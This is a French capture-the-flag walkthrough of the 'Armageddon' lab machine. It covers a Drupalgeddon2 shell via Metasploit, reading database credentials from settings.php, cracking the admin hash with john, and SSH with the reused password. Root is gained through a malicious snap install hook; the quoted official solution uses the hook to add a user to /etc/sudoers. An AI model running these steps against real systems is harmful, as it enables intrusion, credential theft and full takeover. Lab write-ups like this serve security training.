# Armageddon [Linux] Machines

# — 1.Enumeration —

## Nmap

`nmap -sS -A -sC -sV -p- 10.10.10.233`

```bash
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) 
Drupal 7
```

## FFuf

```bash
http://10.10.10.233/misc/
http://10.10.10.233/scripts/
http://10.10.10.233/sites/
http://10.10.10.233/themes/
http://10.10.10.233/profiles/
http://10.10.10.233/includes/
```

## MetaSploit

J’ai essayer cette exploit mais ça n’a pas marché : [https://www.exploit-db.com/exploits/34992](https://www.exploit-db.com/exploits/34992)

J’ai utilisé ensuite drupalgeddon2 depuis Metasploit :

`use unix/webapp/drupal_drupalgeddon2` 

`set LHOST RHOST`

On obtient un shell très rapidement.

# — 2.Exploitation —

## Exploitation de la BDD

Une chose importante en Exploitation Drupal est ce fichier :

`/var/www/html/sites/default/settings.php`

![Untitled](Armageddon%20%5BLinux%5D%20Machines%20a2ac39929d004e299acdd21ce0a218d7/Untitled.png)

On a donc un utilisateur mysql on peut jeter un œil aux tables

`mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;’`

```bash
Database
information_schema
drupal
mysql
performance_schema
```

`mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show tables;’`

Il y a pas mal de table on va regarder la table user.

`mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;’`

```bash
brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt [admin@armageddon.eu](mailto:admin@armageddon.eu)
```

On a un hash du mot de passe de l’admin.

## John Crack Password

On à un hash de mot de passe nous allons utiliser le cracker de hash “john the ripper” 

On met le hash dans un fichier hash.txt

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt > result.txt`

Son mot de passe est booboo

Identifiant = `brucetherealadmin:booboo`

## SSH

Bruce réutilise ces mot de passe, pour sa connexion SSH on peux se connecter 

`ssh [brucetherealadmin@10.10.10.233](mailto:brucetherealadmin@10.10.10.233)` mot de passe `booboo`

Premier Flag récupérer

# — 3.Privilege Escalation —

`sudo -l`
(root) NOPASSWD: /usr/bin/snap install *
On peux installer snap

Sur [Gtfobins](https://gtfobins.github.io/) nous pouvons voir que nous pouvons créé un package malicieux et exécuter des commandes en tant qu’utilisateur root : 

```bash
COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```

On le réécrit pour obtenir notre flag depuis une seul commande

```bash
COMMAND="cat /root/root.txt"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```

Ça nous créé un package malicieux qui affiche root.txt qu'on attrape avec curl :

`curl 10.10.14.16/xxx_1.0_all.snap -o cat.snap` et on installe le package avec cette commande `sudo snap install cat.snap --dangerous --devmode`

L’ordinateur va essayer d’installer le package mais nous aurons en retour le flag à la place.

# — Notes —

## Moi

J’ai essayé de craft un packet qui donne un le compte root :

```bash
COMMAND="bash"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxx -s dir -t snap -a all meta
```

Mais cela ne marche pas car avec cette méthode je n’ai qu’un retour de la commande.

Autres méthode mais pas essayé :

Récupérer le contenu de passwd et shadow pour un-hash le mot de passe de l’utilisateur root avec hashcat ou john ?

## Solution Officiel Pour plus de Piste

Pour la dernière partie exploitation la solution officiel était : 

Sur çà machine :

 

```bash
sudo apt update
sudo apt install snapd
sudo snap install --classic snapcraft
```

Créé un nouveau dossier :

```bash
# Make an empty directory to work with
mkdir new_snap
cd new_snap
# Initialize the directory as a snap project
snapcraft init
# Set up the install hook
mkdir snap/hooks

touch snap/hooks/install
chmod a+x snap/hooks/install
# Write the script we want to execute as root
cat > snap/hooks/install << "EOF"
#!/bin/bash
password="snap_user"
pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
useradd snap_user -m -p $pass -s /bin/bash
usermod -aG sudo snap_user
echo "snap_user ALL=(ALL:ALL) ALL" >> /etc/sudoers
EOF
# Configure the snap yaml file
cat > snap/snapcraft.yaml << "EOF"
name: snap-user
version: '0.1'
summary: Empty snap, used for exploit
description: |
This is an example
grade: devel
confinement: devmode
parts:
my-part:
plugin: nil
EOF
# Build the snap
snapcraft
```

Changer les permissions pour rendre le fichier exécutable

`chmod +x snapcraft.sh`

`./snapcraft.sh`

L’envoyer sur le ssh avec la commande :

`scp -r new_snap [brucetherealadmin@10.10.10.99](mailto:brucetherealadmin@10.10.10.99):/tmp`

Ensuite de l’installer avec sudo :

```bash
cd /tmp/new_snap
sudo snap install --devmode snap-user_0.1_amd64.snap
```

Le package est installé

On liste les snap installé `snap list`

`cat /etc/passwd`

Changer d’utilisateur :

```bash
su nap_user
sudo -l
```

On est maintenant root et on peux faire ce qu’on veux sur la machine !